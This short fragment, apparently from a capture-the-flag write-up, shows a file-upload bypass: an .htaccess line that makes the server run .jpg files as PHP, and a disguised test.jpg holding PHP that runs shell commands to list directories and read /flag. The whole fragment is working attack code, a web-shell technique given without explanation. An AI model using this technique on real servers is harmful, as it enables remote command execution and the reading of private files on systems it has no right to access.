@@ -1,0 +1,10 @@
+<p><code>.htaccess</code>:</p>
+<pre><code>AddType application/x-httpd-php .jpg
+</code></pre>
+<p><code>test.jpg</code>:</p>
+<pre><code class="language-php">&lt;?php
+  echo shell_exec(&quot;ls -la ..&quot;);
+  echo shell_exec(&quot;ls -la /&quot;);
+  echo shell_exec(&quot;cat /flag&quot;);
+?&gt;
+</code></pre>
